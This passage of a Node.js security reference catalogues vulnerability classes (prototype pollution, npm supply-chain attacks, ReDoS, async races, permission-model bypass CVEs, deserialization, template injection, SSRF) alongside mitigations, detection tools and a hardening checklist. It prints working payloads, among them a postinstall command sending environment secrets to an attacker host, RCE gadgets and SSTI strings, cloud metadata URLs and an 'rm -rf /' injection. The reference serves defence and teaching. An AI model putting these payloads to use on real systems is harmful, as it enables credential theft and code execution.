| **Binary encoding alias** | `'binary'` encoding is alias for `'latin1'`, NOT actual binary | Misunderstanding of encoding semantics |

---

## §9. Prototype Pollution — Language-Level Design Flaw

Prototype pollution is a vulnerability class unique to JavaScript, arising from prototype-based inheritance and dynamic property assignment. When a recursive merge or deep-set function processes untrusted input without filtering `__proto__`, `constructor`, or `prototype` keys, an attacker injects properties into `Object.prototype` that are inherited by every object in the application. The pollution is "inert" alone — damage requires a secondary "gadget": any code path that reads an undefined property and uses it in a security-sensitive operation.

### §9-1. Recursive Merge / Deep Copy Pollution

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`__proto__` key injection** | `merge(target, {"__proto__": {"isAdmin": true}})` traverses into `Object.prototype` | Merge function does not filter `__proto__` key |
| **`constructor.prototype` traversal** | `merge(target, {"constructor": {"prototype": {"isAdmin": true}}})` reaches `Object.prototype` via constructor chain | Merge function does not filter `constructor` key |
| **Nested `__proto__` sanitizer bypass** | `__pro__proto__to__` bypasses single-pass string sanitization that strips `__proto__` once | Non-recursive string replacement |
| **Dot-path setter** | `lodash.set(obj, '__proto__.polluted', 'value')` | Path-based setter does not block prototype keys |
| **JSON.parse round-trip** | `JSON.parse('{"__proto__":{"x":1}}')` creates object with `__proto__` own property; subsequent merge pollutes | Parsed object merged into another object |

**Affected packages (historical and recent)**: `lodash.merge`, `lodash.set`, `lodash.defaultsDeep`, `minimist`, `qs`, `json5`, `xml2js`, `tough-cookie`, `flat`, `hoek`, `mixin-deep`, `set-value`, `merge-deep`, `dset`, `deep-merge`, `@75lb/deep-merge`.

### §9-2. Exploitation Gadgets — Pollution to RCE

The academic paper "Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js" (Shcherbakov & Balliu, USENIX Security 2023) systematically identified these sinks:

| Gadget | Mechanism | Impact |
|---|---|---|
| **child_process.spawn() options** | Polluted `Object.prototype.shell = true` + `Object.prototype.env = {NODE_OPTIONS: '--require /tmp/malicious.js'}` causes all subsequent spawns to use attacker shell and env | RCE |
| **EJS template engine** | Polluted `Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').execSync('id');s"` — EJS reads `opts.outputFunctionName` from polluted prototype, injects into generated function source | RCE |
| **Handlebars template engine** | Polluted `Object.prototype.pendingContent` injects template payload into compilation | RCE |
| **Pug template engine** | Polluted `Object.prototype.block` with crafted AST node | RCE |
| **Sanitizer bypass** | Polluted properties override security sanitizer configuration (DOMPurify `ALLOWED_TAGS`, etc.) | XSS |
| **Property override (auth bypass)** | `Object.prototype.isAdmin = true` — any `if (user.isAdmin)` check on objects without explicit `isAdmin` property passes | Authorization bypass |

```javascript
// Prototype pollution to RCE via child_process
Object.prototype.shell = "/proc/self/exe";
Object.prototype.env = { NODE_OPTIONS: "--require /tmp/malicious.js" };

// Any subsequent child_process.spawn() executes attacker's code
const { spawn } = require('child_process');
spawn('echo', ['hello']); // Loads /tmp/malicious.js
```

### §9-3. Input Entry Points

| Entry Point | Mechanism | Key Condition |
|---|---|---|
| **JSON body parsing** | Express `req.body` contains `{"__proto__": {...}}` | Default JSON parser; no prototype key filtering |
| **Query string (qs extended)** | `role[__proto__][isAdmin]=true` in URL-encoded body | Express with `extended: true` (uses `qs`) |
| **CLI argument parsing** | `--__proto__.polluted=true` via minimist | CLI tools parsing user arguments |
| **YAML deserialization** | YAML map with `__proto__` key | `js-yaml` without safe schema |
| **GraphQL variables** | Deeply nested input objects in GraphQL mutations | No input sanitization on variable objects |

### §9-4. Mitigations

| Mitigation | Mechanism | Trade-off |
|---|---|---|
| `Object.create(null)` | Dictionaries without prototype — immune to `__proto__` | Must be used consistently everywhere |
| `Map` / `Set` | No prototype chain for key storage | API differences from plain objects |
| `Object.freeze(Object.prototype)` | Prevents all prototype modifications | May break libraries extending built-in prototypes |
| `--disable-proto=throw` | Node.js flag rejecting `__proto__` property access | Experimental; may break legacy code |
| Key filtering in merge functions | Reject `__proto__`, `constructor`, `prototype` | Must be applied in every merge/set path |
| JSON schema validation (ajv, joi) | Reject unexpected properties before merge | Schema must be defined for all input |

---

## §10. Module System and Supply Chain

The npm ecosystem is the single largest practical attack surface for any Node.js deployment. Every `require()`'d module executes with identical privileges to the main process. `npm install` executes lifecycle scripts by default, running arbitrary code with the user's full permissions. The average Node.js application has 300-1500 transitive dependencies.

### §10-1. Lifecycle Script Exploitation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **postinstall RCE** | `"postinstall": "node -e \"require('https').get('https://c2.attacker.com/c?d='+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""` — exfiltrates all environment variables (including secrets) during `npm install` | Default npm configuration; `ignore-scripts` not set |
| **preinstall reconnaissance** | Fingerprints CI/CD vs developer machine, delivers context-specific payload | Multi-stage attack; conditional payload delivery |
| **build script injection** | Native addon compilation (`node-gyp`) executes arbitrary C++ build commands | Packages requiring native compilation |

### §10-2. Supply Chain Attack Patterns

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Typosquatting** | Packages mimicking popular names: `crossenv` vs `cross-env`, `electorn` vs `electron`. Malicious postinstall script exfiltrates credentials | Developer typo during `npm install` |
| **Dependency confusion** | Public registry package with higher version number than private internal package. Build system prefers higher public version | Organization uses private registry without scoped naming or proper registry configuration |
| **Manifest confusion** | npm registry API manifest (displayed on npmjs.com) differs from actual `package.json` in published tarball. `npm audit` and visual inspection are both deceived | Darcy Clarke, 2023 — registry-level discrepancy |
| **Maintainer account takeover** | Credential stuffing/phishing to compromise sole maintainer's npm account; publish malicious version | Popular package with single maintainer |
| **Social engineering transfer** | Attacker contributes legitimate code, earns trust, receives publish rights, injects malicious dependency | `event-stream` attack (2018) — targeted Copay Bitcoin wallet |
| **Protestware/sabotageware** | Maintainer intentionally sabotages own package: infinite loops (`colors/faker`, 2022), geopolitical file destruction (`node-ipc`, 2022) | Sole maintainer with grievance |

**Notable incidents**:

| Year | Package | Downloads/week | Attack Method | Impact |
|---|---|---|---|---|
| 2018 | `event-stream` | Very high npm usage | Social engineering → targeted dependency injection | Copay Bitcoin wallet credential theft |
| 2021 | `ua-parser-js` | Very high npm usage | Compromised npm credentials | Cryptominer + password stealer |
| 2021 | `coa` | High npm usage | Compromised npm credentials | Credential stealer |
| 2021 | `rc` | Very high npm usage | Compromised npm credentials | Credential stealer |
| 2022 | `colors`, `faker` | Very high combined usage | Maintainer protest | Infinite loops; broke `aws-cdk` and thousands of projects |
| 2022 | `node-ipc` | High npm usage | Maintainer sabotage | File destruction targeting Russian/Belarusian IPs |

### §10-3. require() Module Injection

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Path injection via require** | `require(\`./handlers/${req.params.type}\`)` — user controls module path. `type=../../../etc/passwd` leaks info via error; `type=child_process` loads core module | Any user-controlled path segment in `require()` |
| **Module resolution hijacking** | Node.js searches parent directories (`node_modules/` in `/app/src/routes/`, `/app/src/`, `/app/`, `/`) — attacker who can write files anywhere in the hierarchy shadows legitimate modules | File write vulnerability + `require()` |
| **NODE_OPTIONS injection** | `NODE_OPTIONS="--require /tmp/malicious.js"` — malicious module loads before application, can monkey-patch `require()`, intercept all crypto operations, modify global state | Attacker controls environment variables |
| **NODE_PATH manipulation** | `NODE_PATH="/tmp/attacker"` alters module resolution to load modules from attacker-controlled directory | Attacker controls environment variables |

### §10-4. Environment Variable Attack Surface

| Variable | Effect | Attack |
|---|---|---|
| `NODE_OPTIONS` | Inject arbitrary Node.js flags including `--require` to load modules, `--inspect` for debugger | RCE via module preload; remote debugging |
| `NODE_PATH` | Alter module resolution | Module hijacking |
| `NODE_EXTRA_CA_CERTS` | Add certificate authorities | MITM of all HTTPS connections |
| `NODE_TLS_REJECT_UNAUTHORIZED=0` | Disable ALL TLS certificate validation for the entire process | MITM — frequently recommended on Stack Overflow as a "fix" |
| `NODE_DEBUG` | Enable verbose logging | Sensitive information disclosure via logs |
| `NODE_REDIRECT_WARNINGS` | Redirect warning output to arbitrary file path | Arbitrary file write (limited content) |
| `NODE_ICU_DATA` | Load ICU data from arbitrary path | Code execution via crafted ICU data (CVE-2023-23920) |

---

## §11. Event Loop and Async-Specific Security

Node.js's single-threaded event loop means a single blocked operation denies service to ALL concurrent connections. Asynchronous programming patterns create TOCTOU race conditions at every `await` yield point.

### §11-1. Regular Expression Denial of Service (ReDoS)

V8's regex engine uses backtracking. A regex with nested quantifiers or overlapping alternatives causes exponential time complexity. In a single-threaded server, this denies service to all clients.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Nested quantifier catastrophic backtracking** | `(a+)+$` tested against `'a'.repeat(25) + '!'` — runs for ~33 seconds; each additional character doubles the time | User input matched against vulnerable regex |
| **Overlapping alternative backtracking** | `(a\|ab)+` with crafted input | Regex with multiple ways to match the same character |
| **npm package ReDoS** | `semver.valid()` (CVE-2022-25883), `moment()` date parsing (CVE-2022-31129), `path-to-regexp` route matching — all had catastrophic backtracking | User-influenced input reaching package regex |

```javascript
// Measuring ReDoS impact
const start = Date.now();
/^(a+)+$/.test('a'.repeat(25) + '!');
console.log(`Blocked for ${Date.now() - start}ms`);
// Output: ~33000ms — all other requests blocked during this time
```

**Mitigation**: Use `re2` npm package (Google RE2 engine with guaranteed linear-time matching) as drop-in replacement.

### §11-2. Synchronous API Event Loop Blocking

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Synchronous file I/O** | `fs.readFileSync('/large/file')` blocks all connections during read | Sync file operations in request handlers |
| **CPU-intensive crypto** | `crypto.pbkdf2Sync()` with high iteration count blocks event loop | Synchronous crypto in request path |
| **JSON.parse() DoS** | No async `JSON.parse()` exists. 50MB JSON body blocks event loop during parsing. Deeply nested JSON (`{{{...}}}` 10000 levels) causes stack-intensive parsing | Large or deeply nested JSON body; permissive body size limit |
| **Compression bomb** | `zlib.deflateSync()` on large buffer blocks event loop | Synchronous compression of user-supplied data |

### §11-3. Async TOCTOU Race Conditions

Every `await` is a yield point where other request handlers execute, creating concurrency bugs distinct from traditional threading.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Double-spend / double-redeem** | `coupon = await db.getCoupon(code)` checks `!coupon.used`; between check and `await db.markUsed()`, a second request also passes the check | Concurrent requests with shared mutable state; no database-level locking |
| **File system TOCTOU** | Path validated, `await someAsyncOp()` yields, attacker creates symlink at validated path, subsequent `fs.writeFile` follows symlink | Async code with file operations separated by yield points |
| **Balance manipulation** | `balance = await getBalance(); if (balance >= amount) await debit(amount);` — two concurrent requests both see sufficient balance, both debit | Financial operations without transactions |

```javascript
// VULNERABLE: Double-redeem via async TOCTOU
app.post('/redeem', async (req, res) => {
  const coupon = await db.getCoupon(req.body.code);       // CHECK
  if (!coupon || coupon.used) return res.status(400).send('Invalid');
  // ← YIELD POINT: other requests execute here
  await db.markUsed(coupon.id);                             // USE
  await db.addCredit(req.user.id, coupon.value);
});

// SAFE: Database transaction with row locking
app.post('/redeem', async (req, res) => {
  await db.transaction(async (trx) => {
    const coupon = await trx('coupons')
      .where({ code: req.body.code, used: false })
      .forUpdate().first();  // Row lock
    if (!coupon) return res.status(400).send('Invalid');
    await trx('coupons').where({ id: coupon.id }).update({ used: true });
    await trx('credits').insert({ user_id: req.user.id, amount: coupon.value });
  });
});
```

### §11-4. Unhandled Promise Rejection DoS

Since Node.js 15, unhandled promise rejections throw and crash the process by default. An attacker who can trigger error conditions (malformed URLs, unreachable hosts, invalid data) in `async` handlers missing `.catch()` can cause repeated process crashes.

---

## §12. Permission Model — Experimental and Repeatedly Bypassed

The experimental Permission Model (`--experimental-permission`, Node.js 20+) attempts to add Deno-like capability restrictions. Within two years of introduction, at least 16 distinct bypass CVEs were filed, each exploiting a Node.js API not covered by permission checks. The model operates entirely in JavaScript/C++ — not at the OS level — and has no network restriction scope.

### §12-1. Bypass Timeline

**Phase 1 — Initial API Coverage Gaps (2023)**:

| CVE | Bypass Method | Root Cause |
|---|---|---|
| CVE-2023-23918 | `process.mainModule.require()` | `process.mainModule` not restricted; its `require` operates outside permission model |
| CVE-2023-30581 | `process.mainModule` property access | Filesystem information leaked via mainModule properties |
| CVE-2023-30585 | `fs.statfs()` | Function not instrumented with permission checks |
| CVE-2023-32002 | `Module._load()` | Internal module loader callable and unrestricted |
| CVE-2023-32004 | `fs.mkdtemp()` path traversal | Temp directory creation did not validate path stayed within permitted directories |
| CVE-2023-32006 | `module.constructor.createRequire()` | New `require` function bypassed restrictions |
| CVE-2023-32559 | `process.binding()` | Deprecated native binding API unrestricted — direct C++ function access |

**Phase 2 — Path Manipulation (2024)**:

| CVE | Bypass Method | Root Cause |
|---|---|---|
| CVE-2024-21890 | Wildcard misinterpretation in `--allow-fs-read=/safe/*` | Wildcard granted broader access than intended |
| CVE-2024-21891 | Multiple path separators (`//etc/passwd`, mixed `\/`) | Path matching confused by multiple separators |
| CVE-2024-21892 | `process.binding('spawn_sync')` | Native spawn binding unrestricted despite `--allow-child-process` not set |
| CVE-2024-21896 | Symlinks + Buffer-encoded paths | Permission model checked Buffer path (within allowed dir); OS resolved symlink (outside allowed dir) |
| CVE-2024-22017 | `setuid()` capability retention | Linux capabilities not dropped after `setuid()` |
| CVE-2024-22018 | `fs.statfs` (again) | Still not fully restricted after CVE-2023-30585 fix |
| CVE-2024-36137 | `fs.lstat` | Not instrumented with permission checks |

**Phase 3 — Platform-Specific (2025)**:

| CVE | Bypass Method | Root Cause |
|---|---|---|
| CVE-2025-23083 | `diagnostics_channel` + `worker_threads` | Worker creation events expose internal worker instances/constructors, enabling Permission Model bypass |
| CVE-2025-23084 | Windows drive-name handling in `path.join()` | Drive-name input can escape an intended restricted directory by resolving to a drive root |

### §12-2. Architectural Limitations

| Limitation | Description | Impact |
|---|---|---|
| **No network scope** | No `--allow-net` flag as of Node.js 22. Any code makes arbitrary network connections | SSRF, data exfiltration, C2 communication all unrestricted |
| **No per-module permissions** | All `require()`'d modules share process-level permissions. Malicious dependency has same capabilities as application | Supply chain attacks not mitigated |
| **Native addon full access** | `--allow-addons` grants complete OS access. No partial addon permissions | Single addon permission negates all restrictions |
| **No OS-level enforcement** | Operates in JavaScript/C++ within process. N-API native code bypasses entirely | Fundamental architectural limitation |
| **Symlink tension** | Path-based permissions and symlinks are structurally incompatible. Every symlink resolution fix introduces new TOCTOU | Ongoing whack-a-mole |
| **Still experimental** | `--experimental-permission` flag; not recommended for production sole reliance | API may change; coverage gaps expected |

---

## §13. Deserialization and Dynamic Code Execution

Node.js provides multiple pathways from string input to code execution. The lack of native safe serialization for complex types (functions, Date, RegExp, Map, Set) drives developers to libraries that use `eval()` or `new Function()` internally.

### §13-1. Dynamic Code Execution Sinks

| Sink | Mechanism | Risk Level |
|---|---|---|
| `eval(userInput)` | Direct execution of string as JavaScript | Critical — direct RCE |
| `new Function('arg', userInput)()` | Creates function from string, executes | Critical — indirect RCE |
| `setTimeout(userInput, 0)` | String overload compiles as code | Critical — often overlooked |
| `setInterval(userInput, 1000)` | String overload compiles as code | Critical — often overlooked |
| `vm.runInNewContext(userInput)` | Executes in "sandbox" context (escapable, see §1) | Critical — false sense of security |
| `vm.runInThisContext(userInput)` | Executes in caller's context — zero isolation | Critical |
| `require('child_process').exec(userInput)` | Shell command execution | Critical — see §2 |

### §13-2. Dangerous Deserialization Libraries

| Package | Mechanism | Risk |
|---|---|---|
| `node-serialize` | `_$$ND_FUNC$$_` marker triggers `eval()` of function strings; trailing `()` causes immediate invocation | Critical: direct RCE (CVE-2017-5941) |
| `funcster` | `eval()` of serialized function strings | Critical: direct RCE |
| `cryo` | Reconstructs arbitrary objects including functions | High |
| `js-yaml` (pre-4.0) | Default schema allows `!!js/function` tag creating executable functions | Critical (fixed in 4.0 — use `JSON_SCHEMA`) |
| `serialize-to-js` | Outputs JavaScript source code intended for `eval()` | High when combined with user input |

```javascript
// node-serialize IIFE injection
const payload = '{"cmd":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}()"}';
require('node-serialize').unserialize(payload); // RCE
```

### §13-3. Server-Side Template Injection (SSTI)

| Engine | Payload | Key Condition |
|---|---|---|
| **EJS** | `<%= global.process.mainModule.require('child_process').execSync('id') %>` | User input reaches template source (not data) |
| **Pug** | `-var x = global.process.mainModule.require\n-x('child_process').execSync('id')` | User controls template content |
| **Nunjucks** | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}` | Template string from user input |

**Safe serialization alternatives**: `JSON.parse()` (no code execution), `superjson` (no eval), `devalue` (structured clone), `protobuf.js` (schema-based), `msgpack` (binary, no eval).

---

## §14. DNS Rebinding and SSRF

### §14-1. Inspector Protocol DNS Rebinding

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Inspector WebSocket hijacking** | Attacker DNS resolves `evil.com` → attacker IP (serves JS), then rebinds to `127.0.0.1`. Browser's WebSocket connects to `ws://evil.com:9229/UUID` → reaches victim's inspector. Full Chrome DevTools Protocol access = RCE | `--inspect` enabled (CVE-2018-7160, CVE-2022-32212) |
| **IPv6/0.0.0.0 Host header bypass** | Inspector's `Host` header check bypassed via `0.0.0.0`, `::1`, `[::1]`, or other localhost representations | Inspector bound to non-loopback or Host header check incomplete |

### §14-2. SSRF Patterns

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Direct URL forwarding** | `fetch(req.query.url)` — user controls outbound request destination | Any proxy/webhook/URL fetch endpoint |
| **DNS TOCTOU** | DNS resolved for validation (public IP); DNS rebinds to `127.0.0.1` before `fetch()` connects | DNS resolution decoupled from connection |
| **Redirect-based SSRF** | URL validated, but HTTP redirect (`302 Location: http://169.254.169.254/`) bypasses validation | `fetch()` follows redirects by default |
| **IP representation bypass** | `0x7f000001` (hex), `0177.0.0.1` (octal), `2130706433` (decimal), `127.0.0.1.nip.io` (wildcard DNS) all represent localhost but bypass `isPrivate()` checks | `ip` package (CVE-2024-29415) or custom IP validation |
| **Parser differential SSRF** | URL validated with `url.parse()`, request made with WHATWG-based client — hostname disagrees | See §3-1 |
| **Non-HTTP protocol injection** | `file:///etc/passwd`, `gopher://`, `dict://` — scheme not validated | Allowlist only checks for `javascript:` |

**Cloud metadata endpoints**:

| Provider | Endpoint | Data Available |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | IAM credentials, instance identity |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Service account tokens |
| Azure | `http://169.254.169.254/metadata/instance` | Managed identity tokens |

**Correct SSRF mitigation — validate at socket level**:
```javascript
const agent = new http.Agent({
  lookup: (hostname, options, callback) => {
    dns.lookup(hostname, options, (err, address, family) => {
      if (err) return callback(err);
      if (isPrivateIP(address)) {
        return callback(new Error('SSRF: private IP blocked'));
      }
      callback(null, address, family);
    });
  }
});
fetch(userUrl, { agent }); // Validates RESOLVED IP, not hostname
```

---

## CVE Mapping — Node.js Core

| CVE | Year | Severity | Root Cause | Module | Meta-Pattern |
|---|---|---|---|---|---|
| CVE-2025-23083 | 2025 | High | Permission bypass via `diagnostics_channel` + `worker_threads` | Permission Model | P5 (Implicit Trust) |
| CVE-2025-23084 | 2025 | Medium | Windows drive-name path traversal through `path.join()` | path | P4 (Parser Differential) |
| CVE-2024-27980 | 2024 | High | Windows `.bat`/`.cmd` implicit shell in `child_process` | child_process | P3 (Abstraction Opacity) |
| CVE-2024-27983 | 2024 | High | HTTP/2 CONTINUATION flood — unbounded memory | HTTP/2 | P1 (Missing Limits) |
| CVE-2024-27982 | 2024 | Medium | CL/TE inconsistency in llhttp | HTTP parser | P4 (Parser Differential) |
| CVE-2024-22019 | 2024 | High | Chunk extension parsing — unbounded memory growth | HTTP parser | P1 (Missing Limits) |
| CVE-2024-21896 | 2024 | High | Symlinks + Buffer paths bypass Permission Model | Permission Model / fs | P1 (Convenience Default) |
| CVE-2024-21892 | 2024 | High | `process.binding('spawn_sync')` bypasses Permission Model | Permission Model | P2 (Backward Compat) |
| CVE-2024-21891 | 2024 | Medium | Multiple path separators confuse Permission Model | Permission Model / path | P4 (Parser Differential) |
| CVE-2024-21890 | 2024 | Medium | Wildcard misinterpretation in `--allow-fs-read` | Permission Model | P3 (Abstraction Opacity) |
| CVE-2023-44487 | 2023 | High | HTTP/2 Rapid Reset DoS | HTTP/2 | P1 (Missing Limits) |
| CVE-2023-32559 | 2023 | High | `process.binding()` bypasses Permission Model | Permission Model | P2 (Backward Compat) |
| CVE-2023-32002 | 2023 | High | `Module._load()` bypasses Permission Model | Permission Model | P2 (Backward Compat) |
| CVE-2023-23918 | 2023 | High | `process.mainModule.require()` bypasses Permission Model | Permission Model | P2 (Backward Compat) |
| CVE-2022-35256 | 2022 | Medium | Bare CR without LF in HTTP headers | HTTP parser | P4 (Parser Differential) |
| CVE-2022-32215 | 2022 | Medium | Chunked encoding boundary handling | HTTP parser | P4 (Parser Differential) |
| CVE-2022-32212 | 2022 | High | DNS rebinding against inspector protocol | Inspector / debugger | P5 (Implicit Trust) |
| CVE-2022-21824 | 2022 | High | `console.table()` pollutes `Object.prototype` | console (core) | P1 (Convenience Default) |
| CVE-2018-7160 | 2018 | High | DNS rebinding against inspector WebSocket | Inspector / debugger | P5 (Implicit Trust) |

---

## Detection Tools

| Tool | Target | Technique |
|---|---|---|
| **Semgrep** (`p/nodejs`) | Source code | Static analysis for `exec()`, `eval()`, `Buffer.allocUnsafe()`, `url.parse()`, SSTI, prototype pollution |
| **ESLint** (`eslint-plugin-security`) | Source code | `no-eval`, `detect-child-process`, `detect-buffer-noassert`, `detect-non-literal-require` |
| **npm audit** / **Snyk** | Dependencies | Known vulnerability database lookup for all transitive dependencies |
| **Socket.dev** | Dependencies | Behavioral analysis: detects install scripts, network access, filesystem access, obfuscated code |
| **safe-regex** / `re2` | Regex patterns | ReDoS detection (static analysis) / guaranteed linear-time matching (runtime) |
| **CodeQL** (GitHub) | Source code | Cross-function taint analysis for injection, SSRF, path traversal, XSS |
| **retire.js** | Client/server dependencies | Known vulnerable library detection |
| **Burp Suite / nuclei** | Running application | HTTP smuggling detection, SSRF probing, template injection testing |

---

## Appendix A: Meta-Pattern ↔ Attack ↔ Defense Mapping

| Meta-Pattern | Representative Vulnerability | Attack Technique | Source Location | Mitigation |
|---|---|---|---|---|
| P1: Convenience Default | Shell command injection | `;rm -rf /` in user input to `exec()` | `lib/child_process.js` — `normalizeExecArgs()` | Use `spawn(file, [args])` without `shell: true` |
| P1: Convenience Default | HTTP DoS (Slowloris) | Send headers slowly; server never times out | `lib/_http_server.js` — `this.timeout = 0` | Set `requestTimeout`, `headersTimeout`, `timeout` |
| P1: Convenience Default | Heap memory disclosure | Read `Buffer.allocUnsafe()` before filling | `lib/buffer.js` — `Buffer.allocUnsafe()` | Use `Buffer.alloc()` or fill immediately |
| P2: Backward Compat | SSRF via parser differential | URL parsed differently by legacy vs WHATWG | `lib/url.js` vs `lib/internal/url.js` | Use only `new URL()` for all URL parsing |
| P2: Backward Compat | Weak encryption | Deprecated `createCipher()` with MD5 KDF | `lib/crypto.js` — `createCipher()` | Use `createCipheriv()` with `scrypt`-derived key |
| P2: Backward Compat | Permission model bypass | `process.binding()` provides unrestricted native access | `process.binding('spawn_sync')` | `--permission` updates; avoid deprecated APIs |
| P3: Abstraction Opacity | Supply chain RCE | Malicious npm package calls `exec()` | `require()` system — no capability boundary | `--permission` flag; `npm audit`; `ignore-scripts` |
| P3: Abstraction Opacity | Shell injection via option | `shell: true` on `spawn()` | `lib/child_process.js` — `normalizeSpawnArguments()` | Never use `shell: true` with user input |
| P4: Parser Differential | SSRF (backslash confusion) | `http://evil.com\@trusted.com/` | `url.parse()` vs `new URL()` | Validate with WHATWG; verify resolved IP |
| P4: Parser Differential | Request smuggling | Malformed headers accepted by Node but not proxy | llhttp parser | Keep `insecureHTTPParser: false`; update Node.js |
| P5: Implicit Trust | Prototype pollution | `__proto__` in JSON body pollutes all objects | `JSON.parse()` + recursive merge | `--disable-proto=throw`; schema validation; `Object.create(null)` |
| P5: Implicit Trust | Environment variable injection | `NODE_OPTIONS=--require /tmp/evil.js` | Process environment | Clear/sanitize env vars in production entry |
| P6: Naming Mismatch | VM sandbox escape | `this.constructor.constructor('return process')()` | `lib/vm.js` — `runInNewContext()` | Use `isolated-vm` or separate processes |
| P6: Naming Mismatch | Path traversal | `path.join(base, '../../../etc/passwd')` | `lib/path.js` — `join()` | `resolve()` + `startsWith()` + `realpath()` containment |

## Appendix B: Version Security Timeline

| Version | Security-Relevant Change | Breaking? |
|---|---|---|
| Node 6 (2016) | `Buffer()` constructor deprecated; `alloc`/`allocUnsafe`/`from` added | No |
| Node 8 (2017) | Null byte check added to `fs` path operations | No |
| Node 10 (2018) | `crypto.createCipher()` deprecated | No |
| Node 11 (2018) | `url.parse()` deprecated in favor of WHATWG `URL` | No |
| Node 12 (2019) | `--max-http-header-size` default 8KB (inherited from Node 11.6.0 security fix for CVE-2018-12121; later increased to 16KB in Node 13.13.0) | No |
| Node 13 (2019) | `server.timeout` changed from 120000ms to **0** (no timeout) | **Yes — silent DoS protection removal** |
| Node 15 (2020) | `unhandledRejection` default changed to `throw` (crash on unhandled) | **Yes** |
| Node 18 (2022) | `server.requestTimeout` added (default: 300000ms). `fetch()` API available globally | No |
| Node 20 (2023) | `--experimental-permission` flag introduced. Permission Model | No |
| Node 12.17 (2020) | `--disable-proto` option added | No |
| Node 22 (2024) | WebSocket support; Permission Model symlink fixes | No |

## Appendix C: Security Configuration Checklist

**HTTP Server**:
- [ ] `server.requestTimeout` set (not default 0 / 300000)
- [ ] `server.headersTimeout` set below 60 seconds
- [ ] `server.timeout` set to non-zero value
- [ ] `insecureHTTPParser` NOT enabled
- [ ] Request body size limit configured (`express.json({ limit: '256kb' })`)
- [ ] Security headers set (CSP, HSTS, X-Content-Type-Options) — use `helmet`

**Code Patterns**:
- [ ] No `child_process.exec()` / `execSync()` with user-controlled input
- [ ] No `spawn()` / `execFile()` with `shell: true` and user input
- [ ] No `vm` module used as security sandbox
- [ ] No `url.parse()` for security-critical URL validation
- [ ] No `Buffer()` constructor or `Buffer.allocUnsafe()` without immediate fill
- [ ] No `crypto.createCipher()` — use `createCipheriv()`
- [ ] No `eval()`, `new Function()`, or `vm.runInThisContext()` with user input
- [ ] All file paths validated with resolve + containment check + symlink resolution
- [ ] Error objects from `fs`, `child_process` not sent to clients

**Cryptography**:
- [ ] No MD5 or SHA1 for security-critical hashing
- [ ] PBKDF2 iterations ≥ 600,000 (SHA-256), or use `scrypt`/`argon2`
- [ ] RSA key size ≥ 2048 bits
- [ ] `crypto.timingSafeEqual()` with hash pre-processing for length uniformity
- [ ] `crypto.randomBytes()` / `crypto.randomUUID()` for tokens (not `Math.random()`)

**Dependencies and Runtime**:
- [ ] `npm ci` (not `npm install`) in production
- [ ] `npm audit` in CI pipeline
- [ ] `--ignore-scripts` considered for non-build dependencies
- [ ] Lockfile committed with integrity hashes
- [ ] `NODE_OPTIONS` cleared/controlled in production
- [ ] `NODE_TLS_REJECT_UNAUTHORIZED` never set to `0` in production
- [ ] `--inspect` never enabled in production, or bound to `127.0.0.1` only
- [ ] `--disable-proto=throw` evaluated
- [ ] `--experimental-permission` evaluated for defense-in-depth

---

## References

### Node.js Source Code
- [Node.js core](https://github.com/nodejs/node) (`lib/` directory)
- `lib/vm.js`, `lib/child_process.js`, `lib/url.js`, `lib/internal/url.js`, `lib/path.js`, `lib/fs.js`, `lib/_http_server.js`, `lib/_http_common.js`, `lib/crypto.js`, `lib/buffer.js`
- [llhttp parser](https://github.com/nodejs/llhttp)

### Node.js Documentation
- [Security Best Practices](https://nodejs.org/en/learn/getting-started/security-best-practices)
- [Threat Model](https://github.com/nodejs/node/blob/main/SECURITY.md)
- [Permission Model](https://nodejs.org/api/permissions.html)

### Security Research
- "Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js" — Shcherbakov & Balliu, USENIX Security 2023
- "HTTP Desync Attacks: Request Smuggling Reborn" — James Kettle, BlackHat USA 2019
- "Prototype Pollution Attack in NodeJS" — Olivier Arteau, NorthSec 2018
- "Server-Side Prototype Pollution: Black-Box Detection Without the DoS" — Gareth Heyes, PortSwigger 2023
- "Exploiting URL Parsers" — Orange Tsai, BlackHat USA 2017
- "CONTINUATION Flood" — Bartek Nowotarski, 2024
- [vm2 sandbox escape history and deprecation](https://github.com/patriksimek/vm2/security/advisories)
- Snyk State of Open Source Security Reports 2022-2024
- npm Manifest Confusion — Darcy Clarke, 2023
- ["When Two Parsers Disagree: Exploiting Query String Differentials for XSS" — Voorivex, 2025](https://blog.voorivex.team/when-two-parsers-disagree-exploiting-query-string-differentials-for-xss)

### CVE Databases
- [NVD](https://nvd.nist.gov/vuln/search?query=node.js)
- [HackerOne Node.js](https://hackerone.com/nodejs)
- [GitHub Advisories](https://github.com/advisories?query=ecosystem%3Anpm)
- [Snyk](https://security.snyk.io)
